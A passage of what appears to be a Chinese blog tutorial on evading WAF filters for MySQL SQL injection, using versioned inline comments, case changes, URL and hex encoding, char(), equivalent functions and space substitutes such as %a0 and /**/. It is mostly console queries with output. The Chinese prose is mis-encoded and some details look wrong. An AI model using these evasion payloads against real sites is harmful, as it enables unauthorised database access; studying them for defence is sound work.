class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select /*! id,username */ from tuser limit 4;</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | username |</span><br><span class="line">+------+----------+</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    2 | colin    |</span><br><span class="line">+------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šè¯¥æ³¨é‡Šå¯ä»¥åŒ…è£¹å…³é”®å­—ç­‰ï¼Œä½†æ˜¯ä¸å¯ä»¥æ’åœ¨å•ä¸ªå…³é”®å­—çš„å­—æ¯ä¸­é—´ã€‚</p><p>æ­¤å¤–ï¼Œå¦‚æœåœ¨<code>!</code> å­—ç¬¦åæ·»åŠ ç‰ˆæœ¬å·ï¼Œåˆ™ä»…å½“ MySQLç‰ˆæœ¬å¤§äºæˆ–ç­‰äºæŒ‡å®šçš„ç‰ˆæœ¬å·æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œæ³¨é‡Šä¸­çš„è¯­æ³•ã€‚æ­¤ç‰¹æ€§ï¼Œè®©å¼€å‘è€…ç¼–å†™mysql æ‰©å±•çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥æ§åˆ¶å¼•å…¥çš„åº“ï¼Œä¾¿äºä¸åŒç‰ˆæœ¬çš„ç§»æ¤ç­‰ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="comment">/*!55602 TEMPORARY */</span> <span class="keyword">TABLE</span> t (a <span class="type">INT</span>);</span><br></pre></td></tr></table></figure><p>å½“ mysql çš„ç‰ˆæœ¬<strong>å¤§äºç­‰äº</strong>5.56.02 æ—¶ï¼Œmysql å°†ä¸ä¼šæ³¨é‡ŠTEMPOARYï¼Œ</p><p>å³åœ¨ç‰ˆæœ¬å¤§äºç­‰äº 5.56.02 çš„ mysql ä¸­è¯¥è¯­å¥å°±ç›¸å½“äºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TEMPORARY <span class="keyword">TABLE</span> t (a <span class="type">INT</span>);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚åœ¨æˆ‘çš„ mysql 8.0.12 ä¸Šï¼Œæµ‹è¯•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> version() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.12</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!80012 select */</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!80013 select */</span> <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="å¤§å°å†™ç»•è¿‡">å¤§å°å†™ç»•è¿‡</h2><p>å…³é”®å­—å¤§å°å†™ç»•è¿‡ç”¨äºåªé’ˆå¯¹å°å†™æˆ–å¤§å†™çš„å…³é”®å­—åŒ¹é…æŠ€æœ¯ã€‚</p><p>åŸç†ï¼šæ­£åˆ™è¡¨è¾¾å¼/express/iåŒ¹é…æ—¶å¤§å°å†™ä¸æ•æ„Ÿä¾¿æ— æ³•ç»•è¿‡ã€‚è¿™æ˜¯æœ€ç®€å•çš„ç»•è¿‡æŠ€æœ¯ï¼Œä¸è¿‡ç°åœ¨ç›´æ¥ä½¿ç”¨è¿™ç§ç»•è¿‡æŠ€æœ¯æˆåŠŸçš„å¯èƒ½æ€§å·²ç»ä¸é«˜äº†ã€‚</p><h2 id="ç¼–ç ç»•è¿‡">ç¼–ç ç»•è¿‡</h2><h3 id="url-ç¼–ç ç»•è¿‡">url ç¼–ç ç»•è¿‡</h3><p>ä½¿ç”¨%åŠ  16 è¿›åˆ¶çš„ url ç¼–ç å¯¹æŸäº› sql å…³é”®å­—ï¼Œå¦‚ï¼šunionï¼Œselectã€fromç­‰è¿›è¡Œç¼–ç æ¥ç»•è¿‡ waf çš„æ£€æµ‹.</p><p>åŸç†ï¼š</p><p>ä» urlç¼–ç è§„èŒƒä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸å¯¹è‹±æ–‡å¤§å°å†™å­—æ¯ä»¥åŠä¸€äº›ç‰¹æ®Šå­—ã€ä¿ç•™å­—ç­‰è¿›è¡Œ urlç¼–ç ï¼ˆä½†æ˜¯å…¶ url ç¼–ç æ˜¯å­˜åœ¨çš„ã€‚ï¼‰ï¼Œå¯¹éä¿ç•™å­—ï¼ˆå¦‚ï¼šä¸­æ–‡ï¼Œ&amp;ï¼Œ#ç­‰ï¼‰è¿›è¡Œ url ç¼–ç ï¼Œè€Œ web æœåŠ¡å™¨æ‰ä¸ç®¡é‚£äº›ï¼Œå®ƒç›´æ¥ä¸€è‚¡è„‘åœ°å°† urlå…¨éƒ¨è¿›è¡Œè§£ç æ¥ç¡®å®šæ¥æ”¶å‚æ•°å’Œå®šä½èµ„æºã€‚</p><p>å¯¹äºè‹±æ–‡å­—æ¯çš„ url æ ‡å‡†ä¸è¿›è¡Œç¼–ç çš„å­—ç¬¦æ¥è¯´ï¼Œä½ å¯¹å®ƒè¿›è¡Œ urlç¼–ç æˆ–è§£ç å®ƒè¿˜æ˜¯å…¶æœ¬èº«ã€‚</p><p>url ç¼–ç è§„å®šï¼šå­—ç¬¦å¯¹åº”çš„ 16 è¿›åˆ¶ï¼ŒæŠŠå‰é¢çš„ 0x æ¢æˆ %ï¼Œå³ä¸ºå­—ç¬¦çš„ urlç¼–ç ã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å¯¹é‚£äº› url æœ¬æ¥ä¸ç¼–ç çš„è‹±æ–‡å­—æ¯è¿›è¡Œ 16è¿›åˆ¶ç¼–ç ï¼Œç„¶åå°† 0x æ¢ä¸º %ã€‚webæœåŠ¡å™¨åœ¨è§£ç çš„æ—¶å€™ï¼Œä¹Ÿä¼šå°†å…¶è§£ç ä¸ºæ­£å¸¸çš„è‹±æ–‡å­—æ¯ï¼Œä½†æ˜¯åŸºäºé»‘åå•çš„ WAFåªåŒ¹é…å…³é”®å­—ï¼Œä¸è¿›è¡Œè§£ç ï¼Œé‚£å°±å¯ä»¥ç»•è¿‡äº†ã€‚ä½†æ˜¯ç¢°ä¸Šè§£ç çš„WAFï¼Œè¿™ç§æ–¹æ³•å°±æ˜¯å¤±æ•ˆäº†ã€‚</p><p>æ¯”å¦‚ï¼šå°† union ä¸­çš„ u ç¼–ç ä¸ºï¼š%75ï¼Œå³ï¼š%75nion</p><h3 id="åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡">åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</h3><p><strong>ä½¿ç”¨ 16è¿›åˆ¶ä»£æ›¿å­—ç¬¦ä¸²</strong>ï¼Œå½“ç„¶ï¼Œè¿™é‡Œçš„å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚ï¼šinformation_schema.schemataä¸­çš„ä¸€ä¸ªå…·ä½“çš„åº“åçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ information_schema.tablesä¸­ä¸€ä¸ªå…·ä½“çš„è¡¨åçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¡¨ä¸­å…·ä½“çš„å­—æ®µçš„å­—ç¬¦ä¸²ç­‰ã€‚æ·¡ç„¶ï¼Œæˆ‘ä»¬æ³¨å…¥ä¸€èˆ¬åªåœ¨where æ¡ä»¶ç­›é€‰æ—¶ä¼šç”¨åˆ°å®ƒã€‚å¦‚æœ WAFå¯¹æŸäº›è¡¨/å­—æ®µçš„å…³é”®å­—ï¼ˆå¦‚ï¼šadminï¼Œpasswordç­‰ï¼‰è¿›è¡Œè¿‡æ»¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é‡‡ç”¨å®ƒã€‚</p><p>tuser å¯¹åº”çš„åå…­è¿›åˆ¶ä¸ºï¼š0x7475736572ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ wheretable_name=0x7475736572 æ¥ä»£æ›¿ where table_name='tuser'</p><p>test å¯¹åº”çš„åå…­è¿›åˆ¶ä¸ºï¼š0x74657374ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ whereschema_name=0x74657374 æ¥ä»£æ›¿ where schema_name='tuser'</p><p>é€šè¿‡è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡ä¸¤ç§è¿‡æ»¤ï¼šä¸€ç§æ˜¯å¯¹æŸäº›æ•æ„Ÿå…³é”®å­—ï¼Œå¦‚ï¼šadminã€passwdç­‰ï¼Œä¸€ç§æ˜¯å¯¹å¼•å·çš„è¿‡æ»¤ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨ 16 è¿›åˆ¶ï¼Œå°±ä¸å†éœ€è¦å¼•å·äº†ã€‚</p><p>ä¸¾ä¾‹å­ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="number">0x706173737764</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> doc      <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> doctor   <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> elite    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name<span class="operator">=</span><span class="number">0x74657374</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> test        <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> table_schema,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7475736572</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="operator">|</span> test         <span class="operator">|</span> tuser      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="ç¼–ç å‡½æ•°ç»•è¿‡">ç¼–ç å‡½æ•°ç»•è¿‡</h3><ol type="1"><li><p>mysql ä¸­çš„ char()å‡½æ•°ä¼šå°†æ¯ä¸€ä¸ªå‚æ•°ï¼ˆå‚æ•°ç”¨é€—å·åˆ†éš”ï¼‰éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCIIç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ã€‚å¿½ç•¥ NULL å€¼ã€‚</p><blockquote><p>MySQL CHAR() returns the character value of the given integer valueaccording to the ASCII table. It ignores the NULL value.</p></blockquote><p>æ¯”å¦‚: test å¯¹åº” ASCII ç ä¸ºï¼š116 101 115 116ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ char(116,101, 115, 116) ä»£æ›¿ test å­—ç¬¦ä¸²ã€‚</p><p>åŸç†ï¼šå½“ç„¶å¾ˆç®€å•ï¼Œ<strong>æœ‰çš„ WAF</strong>åªç”¨æ­£åˆ™åŒ¹é…å…³é”®å­—ï¼Œä½ å†™æˆ ASCII ç ï¼Œä¹Ÿä¸æ˜¯ URLè§£ç èƒ½è§£å‡ºæ¥çš„ï¼Œæ‰€ä»¥å®ƒè¯†åˆ«ä¸å‡ºæ¥ï¼Œå½“ç„¶ï¼Œå¦‚æœ WAF ç›´æ¥æŠŠ charç»™åˆ—å…¥é»‘åå•ï¼Œé‚£å°±å‡‰å‡‰å–½ã€‚</p></li></ol><h1 id="ç­‰ä»·å‡½æ•°ç»•è¿‡">ç­‰ä»·å‡½æ•°ç»•è¿‡</h1><p>hex()ã€bin()ã€ascii()</p><p>sleep()ã€benchmark()</p><p>concat_ws()ã€group_concat()ã€concat</p><p>mid()ã€substr()ã€substring()</p><p>@<span class="citation"data-cites="version">@version</span>ã€version()</p><p>æœªå®Œå¾…ç»­...</p><h1 id="å®½å­—èŠ‚ç»•è¿‡">å®½å­—èŠ‚ç»•è¿‡</h1><p>æš‚æœªå­¦ä¹ ï¼Œå­¦å®Œå†è¡¥å……</p><h1 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡">ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h1><p>æ–¹æ³•æ¯”è¾ƒçç¢ï¼Œä¸”æœ‰äº›æ–¹æ³•æ™®é€‚æ€§ä¸å¤§ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é’ˆå¯¹ç©ºæ ¼è¿‡æ»¤çš„ï¼Œå› æ­¤ï¼Œè¿™é‡Œçš„é¢˜ç›®æ˜¯ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€‚</p><h2 id="ç¼–ç ">ç¼–ç </h2><p>ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨ Tab ä»£æ›¿ç©ºæ ¼</p><p>%a0 ç©ºæ ¼ %0a æ–°å»ºä¸€è¡Œ %0b TAB é”®ï¼ˆå‚ç›´ï¼‰</p><p>%09 TAB é”®ï¼ˆæ°´å¹³ï¼‰ %0c æ–°çš„ä¸€é¡µ %0d return åŠŸèƒ½</p><p>ç”±äºä¸åŒå¹³å°ç­‰ä¸åŒï¼Œå¤§ä½¬æ€»ç»“çš„å’±ä¹Ÿä¸å¥½è¯´ï¼Œä¸€èˆ¬å…ˆä½¿ç”¨%a0ï¼Œ%0aï¼Œ%0bï¼Œ%b0 ç­‰æµ‹è¯•ã€‚</p><p>ä¸‹é¢æ˜¯å¤©ä¹¦ä¸Šçš„ä¸€æ®µè¯ï¼š</p><blockquote><p>%a0 æ˜¯ç©ºæ ¼çš„æ„æ€ï¼Œï¼ˆpsï¼šæ­¤å¤„æˆ‘çš„ç¯å¢ƒæ˜¯ubuntu14.04+apache+mysql+phpï¼Œå¯ä»¥è§£æ%a0ï¼Œæ­¤å‰åœ¨ windows+wampæµ‹è¯•ï¼Œä¸èƒ½è§£æ%a0ï¼Œæœ‰çŸ¥æƒ…çš„è¯·å‘ŠçŸ¥ã€‚ï¼‰åŒæ—¶%0bä¹Ÿæ˜¯å¯ä»¥é€šè¿‡æµ‹è¯•çš„ï¼Œå…¶ä»–çš„ç»æµ‹è¯•æ˜¯ä¸è¡Œçš„ã€‚||æ˜¯æˆ–è€…çš„æ„æ€ï¼Œ'1åˆ™æ˜¯ä¸ºäº†é—­åˆåé¢çš„ ' ã€‚</p></blockquote><p>å¸¸ç”¨çš„ URL ç¼–ç ä¸­ï¼Œä¼šæŠŠç©ºæ ¼ç¼–ç æˆ%20ï¼Œæ‰€ä»¥é€šè¿‡æµè§ˆå™¨å‘åŒ…ï¼Œè¿›è¡Œçš„ URLç¼–ç ä¸­ï¼Œç©ºæ ¼è¢«ç¼–ç æˆ%20ã€‚åœ¨ HTMLç¼–ç ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªç¼–ç å¯ä»¥å–ä»£ç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯%a0</p><p>è¿™ä¸ªç®—æ˜¯ä¸€ä¸ªä¸æˆæ±‰å­—çš„ä¸­æ–‡å­—ç¬¦äº†ï¼Œé‚£è¿™åº”è¯¥å°±å¥½ç†è§£äº†ï¼Œå› ä¸º%a0çš„ç‰¹æ€§ï¼Œåœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶ï¼ŒåŒ¹é…åˆ°å®ƒæ—¶æ˜¯è¯†åˆ«ä¸ºä¸­æ–‡å­—ç¬¦ï¼šï¿½ï¼Œæ‰€ä»¥ä¸ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åœ¨è¿›å…¥SQL è¯­å¥åï¼ŒMysql æ˜¯ä¸è®¤ä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ç›´æ¥å½“ä½œç©ºæ ¼å¤„ç†</p><h2 id="å¤šè¡Œæ³¨é‡Š">å¤šè¡Œæ³¨é‡Š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select<span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit <span class="number">4</span>;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">2</span> |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">4</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨éœ€è¦ç©ºæ ¼çš„åœ°æ–¹è¡¥ä¸€å¯¹å¤šè¡Œæ³¨é‡Šå³å¯ã€‚ä½†æ˜¯ï¼Œå½“/*æˆ–*/è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå°±ä¸å¥½ç”¨äº†ã€‚</p><h2 id="æ‹¬å·">æ‹¬å·</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(id),(username)<span class="keyword">from</span>(tuser)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>)<span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),(<span class="number">2</span>));</span><br></pre></td></tr></table></figure><h2 id="è¿ç®—ç¬¦ä¸å°æ•°ç‚¹">è¿ç®—ç¬¦ä¸å°æ•°ç‚¹</h2><p>æˆ‘ä»¬çŸ¥é“ mysql å…è®¸ select æ—¶å¯¹å­—æ®µè¿›è¡Œç®—æœ¯è¿ç®—ï¼Œæ¯”å¦‚ï¼šselect 2*idfromxxï¼›ç­‰ã€‚è€Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“åœ¨è®¡ç®—æœºä¸­ï¼Œå–æ­£å–è´Ÿä¹Ÿç®—æ˜¯ä¸€ç§ç®—æ•°è¿ç®—ã€‚</p><p>é’ˆå¯¹æ•°å­—å‰åç©ºæ ¼çš„ï¼š+ - .å³ï¼šæ­£å·ï¼ˆåŠ å·ï¼‰ï¼Œè´Ÿå·ï¼ˆå‡å·ï¼‰ï¼Œæµ®ç‚¹ï¼ˆå°æ•°ç‚¹ï¼‰ã€‚</p><p>æ•´å‹å‰é¢çš„ç©ºæ ¼ï¼š</p><p>+-å¯ä»¥æ”¾åœ¨æ•°å­—å‹å­—æ®µåå‰é¢ä½œä¸ºæ­£è´Ÿå·ï¼ˆå¦‚ï¼š+1ï¼Œ-2ï¼Œ+idï¼‰ï¼Œè¿™æ ·ä¸€æ–¹é¢å­—æ®µè¿›è¡Œäº†å–æ•´å–è´Ÿçš„ç®—æœ¯è¿ç®—ï¼Œå¦ä¸€æ–¹æ–¹é¢ï¼Œç”±äºæœ‰ç¬¦å·éš”å¼€å…¶ä¸å‰é¢çš„å…³é”®å­—select æˆ–å…¶ä»–å­—æ®µï¼Œmysql å°±ä¸å†éœ€è¦ç©ºæ ¼äº†ã€‚</p><p>æ•´å‹åé¢çš„ç©ºæ ¼ï¼š</p><p>æ–¹æ³•ä¸€ï¼š</p><p>æµ®ç‚¹ï¼ˆå°æ•°ç‚¹ï¼‰å¯ä»¥æ”¾åœ¨æ•´å‹å­—æ®µåé¢å……å½“å°æ•°ç‚¹..ï¼Œå°æ•°ç‚¹ä¹‹åæœ‰æ²¡æœ‰å°æ•°ä½éƒ½æˆã€‚ä½†æ˜¯è™½ç„¶å®ƒä½œä¸ºä¸€ä¸ªç¬¦å·å°±å°†å…¶å‰é¢çš„æ•´å‹å­—æ®µä¸åé¢çš„å…³é”®å­—æˆ–å­—æ®µéš”å¼€äº†ï¼Œmysqlå°±ä¸å†è¦æ±‚ç©ºæ ¼äº†ï¼Œä½†æ˜¯åŠ å°æ•°ç‚¹å¯ä¸ç®—ä¸€ç§è¿ç®—ï¼Œé‚£è¿™æ ·å°±ä¼šæŠ¥é”™ã€‚</p><p>è¿™é‡Œä½ éœ€è¦çŸ¥é“åœ¨æ•´å‹å­—æ®µåé¢ç”¨+ã€-ï¼Œé‚£å°±æ˜¯å››åˆ™è¿ç®—ä¸­çš„åŠ å‡å·äº†,+æˆ–-å·¦å³éœ€è¦éƒ½æœ‰è¿ç®—æ•°ï¼Œæ¯”å¦‚ï¼šid+1-1ç­‰ã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ï¼šid+1-1. å³ï¼šid åŠ æ•´å‹ 1 ç„¶åå‡å»æµ®ç‚¹æ•°1.çš„æ–¹å¼ä½¿ä»–ä¸æŠ¥é”™ï¼Œè€Œä¸” idçš„å€¼ä¸å˜ã€‚è¿™ç§æ–¹å¼å°±å¯ä»¥çœç•¥æ•´å‹å­—æ®µåé¢çš„ç©ºæ ¼äº†ã€‚</p><p>æ–¹æ³•äºŒï¼š</p><p>ç§‘å­¦è®¡æ•°æ³•ä¸Šåœº</p><p>a*10^b å†™ä½œï¼šaeb</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1e0</span><span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1e0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span>ide0from tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line">ERROR <span class="number">1054</span> (<span class="number">42</span>S22): <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;ide0from&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;field list&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@var</span><span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@vare2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@vare2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@var</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span 